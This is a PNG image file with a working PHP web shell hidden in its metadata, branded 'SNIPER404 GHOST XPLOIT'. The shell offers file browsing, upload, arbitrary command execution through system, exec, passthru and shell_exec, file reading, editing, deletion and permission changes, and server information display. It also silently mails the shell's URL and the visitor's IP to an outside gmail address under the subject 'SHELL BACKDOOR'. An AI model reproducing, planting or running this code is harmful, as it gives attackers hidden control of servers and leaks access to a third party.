�PNG

   IHDR         \r�f  0�eXIfMM *       0c   J      0�      0�(                  <?php
error_reporting(0);
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html dir="auto" lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="robots" content="noindex, nofollow">
<meta name="theme-color" content="#434343">
<link href="https://fonts.googleapis.com/css2?family=Metal+Mania&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">

<style>
body{
font-family: Kelly Slab;
	background-image: url("https://raw.githubusercontent.com/Sniperxxx/web/main/memeque.jpg");
	color:#ffffff;
	background-attachment:fixed;
	background-repeat:no-repeat;
	background-position:center;
	background-color:transparan;
	-webkit-background-size: 100% 100%;
}
#content tr:hover{
background-color:#009999;
}

.XPLOIT:hover {
background-color: transparent;
color:#009999;
}
.PEMALANG {
color: #ffffff;
font-size: 35px;
font-family: "Metal Mania", cursive;
text-shadow: 0px 2px 0px #ffffff;
}
table{
border: 1px white solid;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:#ffffff;
}
input,select,textarea{
border: 1px #ffffff solid;
-moz-border-radius: 4px;
-webkit-border-radius:4px;
border-radius:4px;
}
</style>
</head>
<body>
<center><span class="PEMALANG"><a href="?" class="XPLOIT">SNIPER404 GHOST XPLOIT</a></span></center>
<table width="915" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>';



echo "<tr><td>
# DISABLE <td>: <font color='lime'>".$liatds = (!empty($ds)) ?"<font color='#b200ff'>$inids</font>" : "<b><font color='lime'>SECURE</font></b>";

//info server
echo "<tr><td><font color='white'>
# YOUR IP    <td>: <font color='lime'>".$_SERVER['REMOTE_ADDR']."<tr><td><font color='white'>
# SERVER  <td>: <font color='lime'>".gethostbyname($_SERVER['HTTP_HOST'])."<tr><td><font color='white'>
# SYSTEM     <td>: <font color='lime'>".php_uname()."<tr><td><font color='white'>
# AUTHOR   <td>: <font color='lime'>SNIPER404<tr><td><font color='white'>
# ABOUT  <td>: <font color='lime'>NO COLI NO PARTY</font></tr></td><br>
</table>";
 
echo '<table width="95%" border="0" cellpadding="0" cellspacing="0" align="center">
<tr align="center"><td align="center"><br>';
 
//PATH
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}

//UPLOAD
echo '<br></td></tr><tr><td><br>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="lime">Upload Berhasil</font><br />';
}else{
echo '<font color="#ffffff">Upload gagal anjing</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="#ffffff"></font> <input type="file" name="file" />
<input type="submit" value="UPLOAD" />
</form><br>';

echo "<form method='post'>
<font color='#ffffff'></font>
<input type='text' size='30' height='15' name='cmd'><input type='submit' name='execmd' value='EXECUTE'>
</form><br>
</td></tr>";
if($_POST['execmd']) {
echo "<center><textarea cols='60' rows='20' readonly='readonly' style='color:#ffffff; background-color:transparent;'>".exe($_POST['cmd'])."</textarea></center>";
}

echo "<br></td></tr>";
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';


//CHMOD
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<br><br><font color="lime">CHANGE PERMISSION SUCCESS !!</font><br/>';
}else{
echo '<script>alert("Change Permission Gagal !!")</script>';
}
}

echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" style="width:80px; height: 30px;"/>
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Lanjut" style="width:60px; height: 30px;"/>
</form>';
}

//RENAME FILE
elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<br><br><font color="lime">CHANGE NAME SUCCESS !!</font><br/>';
}else{
echo '<script>alert("Change Name Gagal !!")</script>';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="5" style="width:20%; height:30px;" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Lanjut" style="height:30px;" />
</form>';
}

//EDIT FILE
elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<br><br><font color="lime">EDIT FILE SUCCESS !!</font><br/>';
}else{
echo '<script>alert("Edit File Gagal !!")</script>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src" style="font-size: 8px; border: 1px solid white; background-color: transparent; color: white; width: 100%;height: 1000px;">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Lanjut" style="height:30px; width:70px;"/>
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';


//DELETE DIR
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<br><br><font color="lime">DELETE DIR SUCCESS !!</font><br/>';
}else{
echo '<script>alert("Delete Dir Gagal !!")</script>>';
}
}                                                     

//DELETE FILE
elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<br><br><font color="lime">DELETE FILE SUCCESS !!</font><br/>';
}else{
echo '<script>alert("Delete File Gagal !!")</script>';
}
}
}

?>
<?php
echo '</center>';
$scandir = scandir($path);
$pa = getcwd();
echo '<div id="content"><table width="95%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<th><center>Name</center></th>
<th><center>Size</center></th>
<th><center>Permission</center></th>
<th><center>Options</center></th>
</tr>
<tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td class=td_home><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='><a href=\"?path=$path/$dir\"> $dir</a></td>
<td class=td_home><center>DIR</center></td>
<td class=td_home><center>";
if(is_writable("$path/$dir")) echo '<font color="#57FF00">';
elseif(!is_readable("$path/$dir")) echo '<font color="#FF0004">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td class=td_home><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href=\"?filesrc=$path/$file&path=$path\"> $file</a></td>
<td class=td_home><center>".$size."</center></td>
<td class=td_home><center>";
if(is_writable("$path/$file")) echo '<font color="#57FF00">';

echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/><font color="white">Sniper404 Ghost Xploit</font><br>';
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$بريد = 'sniper404ghostxploit@gmail.com';
$sl = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$رسالة = "LINK $sl IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($بريد, "SHELL BACKDOOR", $رسالة, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");

function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
//////all functions disini tempatnya/////
function exe($cmd) {
if(function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	} elseif(function_exists('exec')) {
		@exec($cmd,$results);
		$buff = "";
		foreach($results as $result) {
			$buff .= $result;
		} return $buff;
	} elseif(function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	} elseif(function_exists('shell_exec')) {
		$buff = @shell_exec($cmd);
		return $buff;
	}
}
?>     H      H   7�=e  'uIDATx��]	tU�n���3�>xF������EE�t��0$�iPDY�d����o0��"a�lB�A l���%�$��_uwB�KuUW��{Ϲ� ��W���}��w��%��P�����VY�49�R��NIn�7%�F$�i�{��.�M�S<�����~��,�?+����o������3�g����k���)��-�/"i�A�gP+`�te10'2X示i)�����?K���ק��S���|���;�]�N|7�������*oLDD�$��2�/=����@��g�B��@L\�'�3���:�P�^p��W�3�πg�3ɛ�#<c��0��a���ٓ�ܴ�g�� []���FDr����lxF<+��. w��AW%{�.�v��x�< L�l��,x�g�3�ٵ1����e�8R��Lg���-�|���Mɦ�'�����S��c����L,GD�u|:���:&g�x��V�<�!`�0f;�!�R,J��ҙ�H�ً�w�Z֪j��#[2ԐA�6�<�[�������IĆ��Q����c�1�XK�@�Ri֝~�8���5yqq�c�L��"���]�E��&�� ]ʩ,7�D+�}.��ޒ����DX�w�w#*b��lӜ[��[���D�,�"$~7�w�\,V���%%�x�T�Zf{�{�}�G�xgxwb�"�$)��x&���h�l|�bxgxwx�x�b�"a����K���
�B�.�N�n��E�lq���$N5�&�w&����]�ŋh���<C�檳��8��]�˶�8��\Q��M��06J*/>S�x����R]w��6��dn`���"�Ӈ^m#�\؄ ��r��.Jʢ1���������%�؈ Ł�[L{�K^'�|��u�A�C���rJo$w_4�]��t�6#�Ū����G���Y_4Ro �$�7�Ϯ����ɬ/�7 �-��Y
HZ���\��E-"�M�m	�l+Ԉw��t������)�m���@�I��t���:H
zD�- ����`s�<H��!.��K����ZᎱ��E��_Ԓ%�lP�h�z�ݰ�|�1��ZZJ�6[��@��1���ݓ�e�/j��`����s�كt	�d?�Y_Ԏ� l6*H5A�<�f\��D���v��Fa��X��Yi<�����6W����f��D�;r9f����Je�fa���h�z��-p����r��vaÂd����g= �U�؆a˂�H���ԋ�_�	$ [�M�Ù����_ԉ$ ���X�'����z���$J��6s g+jsMtk.���HL X�?����$�!y��%D[�������6�${�#ف:Ғs�<0Ef���P��VUT��2RIEE�h�����`Ǒ@QK�����[`F��~�EkN�����
7m���B��t?]����Ԇ� �+��O�.+��*�i�k��sL*��7Q�O���/�Q��}quZ�%�����7O�Y�c�z���~�/L���7{��U�"` )�v>C��:��X���09� |$���.�C]�9��`"~f4�Q���S@#��M�����mD���uJ`��T$��Ew��z���	8� $0�.�1���q	x}� �N�eRb��vĲ�O�y ����O�p�'�I�� F	��t�T_�m�B �$ h>���;�ϳ� -(�V�C/u+��8� |$PHKWm�~cN8b9 � +�

r�3��ʊp6h$������F��#H Xf�Q����C[��W�� ��$�rMeM,��L�@Ęi��Y�����X��@7����c�:��'� C���Xe�{�	�<�5���GA����w�m���>!��" ��ȟٸ��~��$�8,)�ɇ���]}� � $�13�cF�HQ�J���Ԧ!ކ;�.m�� � �?2	�l�rJ��.�?�t�*࿍ٶ�.�'��#l"��&�}��3����r`���oҗ.���z;5��o��OL��wP[
��]H�)����<����	>B B 	��O�� �V�Ϡ)0֞�wS�ZJ�
�؏ $����9��Gl1����f��~}�,vO����>! !�Sv2	��Y1�0D=������kU����^��˽��q��k��=f���B>=߮'�4L�4g���I�H@�cس������J�S`����e�Z-��]�GY��7ewdw�W@DM,�Y�+u�	 s�0hp*e��g! !�H<��v�����3�o+>��ȠV�)�^! �	 @�V��yZ��B~����;��@��>���b�oϫ�gпexfl��Ai�z��z� D�%���71	�S�ȍE��m������������_�1RUUE���СC�-�#GJi]a�ۈc�p�!%�K%*��B "���}���f,"��T��� D�؎b�N37����ٴ?�+ "`�� �	��7��i�J���H�@��B�L���1�1�ڵ�_@$�	 �F�U3"�Y���B "�D �2Y�����lf����B "�F ~/`0k$�.|�
�)�M �UD��(�^�^� f���R��7� `�/������N4��1��WT	4�e�� ]ɍ�UJ�Œ `�]WTP����T�9�^���Y`׈�� Ug�X f#d�U��T�9�^ h0pP��>�I����gЂ��ݨ��2����c�R�B B B ʵg����X��! !��%��e���D�3��\�Ne�_�X�cU%u_It�_ocſ	��81`��y�Oud7����1�se���y�4j]>MܐK/��X[@[u�����\U%`ϓ�N �zr��Uw�� �W ���'�9�g��T��:�})���mO�v���~z���+�<! �d����y�=��Uw�� �?f����oNT܊��ZKS|����e��4t�f�3B �;Ux50��Im�R���@t�r�&:��6y�==��oI�v�/e����@�����20ɁÜ�������/۹-nq���&��n�0�sU���A!�Ȗ�tx��C���?�	��>EPoZ�������i*U'�?\�]C�Vـ��vX�}q��t�@|@�6{�.������X�e�I���aL'e��7������_@���7�0�����9pPp���y	Qf�2@@������CS����;ȫ�i49������螛��H	 ��=鞼�B v;M���ͺ��x��'�z�����ZF7�[@��Hs���}?���_o�M {�^��UǄ �����㦖�n��)p*�o���Rf���x��Wi��w	pg^9l^��H�5E#��%`�8 co��?��8i�� л~���|�R^�b��afaBؠ�P��>W�QqВf|�;$`G/ v���NZ�;� ��w_���s�b�g���S&��7�Q����"��?��~*�uWd�@�]Q:�S� ��0��G�3tZ���� �=�S��Q��k���$&��7��ۘ |1�kxi�b:���;�l@2U��L���� �q`����˘v8i��T�͑�ۗ�P�w'QҿO	�D��P�z��Tƛ~|5���`�|�4#n�6	�������w�W:�I �;V��?|���� ��I�	�ݻ/k��;��o��s�����=T���V�m�6����p���_�F��X�Ч�8�~��?�2���w \'��'��Ƞk?����: �.� �s
g����i����3���]���l��q ��)�)��B v& ^%u���A��`�@����딳V�J�]86�5~W���-�
$�� ��:�F��� :� *�5�����u}��돔 ������IT*]�,�?�����3�/���B �$ ��毖����~�z4���W��R�� �  �:0_��7�90P����T�=%��k��n�"WWf@@�!�:0_;�Չ��� �w�*��7�U~Q��6	�[��Aw������+ �N �L ��QēV���(eBI��8u]�$ uE��&�� �C ��T�Iio��n���[D�	`��� f؃ ­�3J}%���m�wL�LC��==��5= �i�� l@ Z�_��Q�O�$�%�o��KD>�w]0�n]��_|T)`� c^�ؤ/]��
� �& }U~���V2<Ig�p���8w8u�l4��r&2�� �nR �Z=DM�/{ҽB �@�*����F���# ��Q�#�$��P�nS0�ZgRj�CQ� ���3������@m����_G�	DY������S�� �7UW�Y��ˁs>���G��$0�0���}@_����N �*���36;�y���x@eH�w9��݀GB ���}�!{T�U������/��p$�7�� �' `ߕ�IB �%�ڽ��̨�3�d8[ۈtjzP�뒀���@� ��x?]b 1# _/���*?;��	�L��_W�d8�0�=cU�$Ъ���R�U��o`h;���=	pl8c����5B 1  /�k?��%�>���ŭƷ2,0 �ё���@��`�������*?c7��4 �ё�� cP�؇����t��	x���3��f`P����},�G �u�I���$�>�Q^�E�=!��؇P&`����!�&�lj���	 |0�(�P)`<��RQ����Y�M�>n		�T
�@ ډ�
9u��M�������'L".�~I��� " YK  �E�9P6Z�Bc����Ŕ� �[H� �U���6��W����������S��@7�j�B �%h z��}g�ڹ�(��3q���H`a	��B `����u�O�O��"����|��HӖO���J! #
�P(T�m+ʹ�ά������L=Va�+� �.��@����/�g�v�?���2(��}�nj�o7���(]�݁�3�#XG�Mri �o�@t��d;pt�Y�K��|�n~k�pQ��2k8u��4��z���hC�9��[-�v`i�+/�#��X�D�ѣ'���et����w/A�%��H �9\�����)hMA[y��ED�/��� ""�F '"G�����t4�*"gP�pP�xp7-�#`�kǃC�"hv�`! �x  `�w$�C/
��� ���l��+�]M ə�Ub ""q`�W@R&%rP�ԉ� B "B uj ��|5���E�&(t�  "Pg c�w�5��^@D$.�{`�U[R�4Չ�@! !�: ƺ���dS�����	 X?� 80p�G������ ����@&]ƹ�N�$ "P�cX?� \��iinZ�@`�@ee%9r�~��7ڿ?k���Љ'brG��C�с����ÇSEE����8��O�^vZ�J��?��Ӕ��ݠ~�����_^^N˖-�1c��=��C�[�����/�?���9���K(11�z��EÆ�ٳgӞ=�����i�ҥ��/�}��G�_=5m�T��s�=W�K/��RRR�w��4j�(���5����eWC��M}�0N P  yֆtҤI���x�b������Nz����?��{�1�����\UUU��_ҭ����C۷o���!��z �x��視�"8�8��p��WÔ)S"�fii��U�q����u�Y���k�c���ʊ�گ_?*,,�����$�f��w�( �I^�� �ìo�:bĈ�c�}��l�����+hΜ9B �i����	�	��8�S �[n��P�E��;w�W0��O?�tz뭷� �^�3�]�$�Kw�`/�Zy�����z�g�	lذ�.��bӾ?�$���0�`l�$��l��k��9%���I�`:��#������}��ЈQ�c ����+���V�^-`���1l�$ �G���;�P� �2�ԩSX B���?��k��ƍ�aNNu��9,7|͚5�|?���5
�=�}��G�G����k���̰� )C#S�B �����= C	�2�)q �	���+��5zC�<�`�u�g�}��i׮]X�G '�,_��RSSC^�������`��p�`���2�����y�,Z�(你"/T.8~/ ��NX��ҥ���a���?���ޅ^H[�n0�p�206\އ~ϛ�V;a�2 ء��_~9��A0U�-��׿Һu�߅7ѣG���G���͛#���?�u�N�*`\����+ᣃ�;a�2�;6d�o����J�������{��ӧӊ+�}��-[�h��P@}�g"�cǎiՀ��{�7�l��	 �]������/T%  ��;���;�#�J>��&L�2���k��,X2� �aժU���K��d������!��Jz�Ñ�u�/T% ����,fn�d�̙!g����{��E0o��@���uI��\�I��՗�@QQ�w�y~����v��o� �'@� 3jl�q!�(�`إW��������� U	`�ʕ���EFD�,A>?L�<Y���t	����c��N����&��>t��Uy�*̛7/��5k��̺�]��$ 	E#�
z�:X�HDe f�]`��$g�W�e�����o����!���*�}�KdBUb� tF���h%i��{T% ���}E=f z��0T ��"��'��-ZDS�? ����j�T�P� ^z�%� :���A�6M�B����	�����2J������ʓ�t�M� b�7��G*/y�WB�� ���f#�+��9��B�`��0mڴ������2S�]|C��c	�LE4���`ߑ��fi5����� f]F
��T\85ضm[-Xg��T�M�6!� �&�F�zꩠ��6h+��H ����h�r 5ff٪���4 �uffݞ={�$�>� ��	�\���:��g������]E�T�T% ��+�6`3g��G(x����P��M*#�1F]f	�)ޜ���UJ	�J � |���7�9���݈�఑Pп�34�`7�g&�# ��f�At��L���T�T% �p�O��Θ1C�}����t"B�P�,Y�$d�t9�`�gl��^c�pw�U��J �Y|������G*h/�9����K'݌�B�mX�<��sA����V�x���%��+�Qƙ�x*7	�9K4�D��K�֭�=�>��s����!� �o�<x0�#hbV������銕$eP��*x* �|��|��'#�'l�	v����j�B8-�#m卵}���jQ� ���_
L�b)�x�w�CU�}��7a�fwTׅ��>©�رc�MA�dh�/am�K! ����j�7`��DU' ���O'��*��z:Թ�Xlڴ��!�Ng`t/FӆJwA&8�+��<�A�N ~�]V�����N ��0 ,W|�С�=�����6f�W_}U#	=���/ U�� ���S8~�x�H1�1��ymo8�@K�$$4�?�e������s|��� '�S~0;Gr�.�豞�(j�w��U��ϟ??hQ���7�o�����tY)�zeg/�)����=���/�������!C,� �h��2�\VK��t!7ȷ�� �/���᠃�ά��Gn��4����Wۅh'�+hXc�{.;�!}��0� $�>��JQG��D�T'bo$'�����(�G ր9�]�y�<;.�& ������T���n�hf}��#�����F|<ìY�,m���7�̋�٧	��6\�p�n�AV N�Ew��To�k۶m4r�HjҤI؀C& ��rss��f��� /��"�=�{@��/��!��N�9���()k7/�J Ȱ��|ԧ87Z�w���Z ��#�<�m�EaRw '���H��^���V!''G;w�{�Ѿߏ��Ѻ�����U�V���J Z��1沫4�K�{��NA+	�J���F����'����������u)ʅ DT; 0l�T��)vY
��N ~��K��?��7(�a)  �2 C�0�RI8O�=�Kǭ�
�(K (�eK.��k��K! U	���w�KUi֏�ȑ˥V������/�Y
�Tv_������1( ���R츜 ��Ȱj����j � 3.��3tZ���[�Q� �u?c�q9I�f�yV�� DT!���Xq9QZfRb��vĲ>@@D &�`��dIʢ;8�Y�� ! ��/�_l��Ax�34V^����	@��cL��F8��Q�Wc(�-�,�O`;1��g,8.���O�rK�O�$fUZ�^YD��v`C&���Xpţ`�w7Yf	��$z>GYD��v`C&v�]��&��	>L͘� �BImx}�h��Hd�����L��`�.Nz(��AEf��uJ��
��J1l�����f�p�a�uؼ ���u��c	�ɇp�ϖl%ڲKT�Fa��l�D���47uc��$�O��z.!��r�{DE�6ۀ����ӏm6.H"ə�S;uئ'���:ɇm�-g90�z		�:	��iAv$���z�����aðeA�Θ ���
	�*	~�]Y��HΦmv>�\T��"/I��(O��V,�������o����7�b��D_"����g~بT��$��K�yBb�v\��6a��T�1vzi2<�+�'j1�~�M6��]}�j�5��1�D���a��f�Hp�A/γ��Ev�
-�Ԋ_D�F�$�A�>?�sa{�@H��tz��J\@��{|�����y6�pO���e�,	DM��s 6&�}�ɒ@��?�)g�9]�x�����Z�,�hT��lC�%ؔ K1Iɢ\��Q�Q=�>l6$HR���_�4/o@4�#��V`3�A�C�Xؕ['ހh�Y6"�{*�y�">m�����i�]ۀ�R����fsu��8.��j�;�r��� #��sg:#9��cCЂ�R@_=~p#l � ��Si�A��7����@����]���D4i�EMycǿ8����C�y����]�ŋ�+����v��3D��c"��x��yG$\Iʠ46����(
|~wx�x�b�"����)�n�ʆU�Z������r��݉��:�Ps�	6��ܢ��$}h�t��'��;j.+b��<����yvY�;Ī$�hm*� ��DJwEbG���Du��&��p�F�$V`��^����� �B,R�2I̠�x�3Q.����,K�]�־4�q�1�c.�'b/ኲ�{h���%����]y5.>�r��%U{"*H����k8��w5q�,�t�y�0f;�a���Q=^�Hl��x��m���&�Z������ƈ�J��"��p��]����F��9냵��ĬBz������XȚ^$.��S�LH�p}znM������=�O��T��5���;�	φgĳ���b""u�^�<�M7p���!�i��B���6�j���5xc�z@��#���{�3�Y�L�fEDt
��j�2�+����ȳ��y��ȋ�[}�68ӽ���ȫ�^�z�� ߍ{������{�m�""1j���_�-��T��k_nj9��9��=�w��v�u3k1��0�Y��W�~��[1~���h��k�Z�&������N9 C}��z�F�yA    IEND�B`�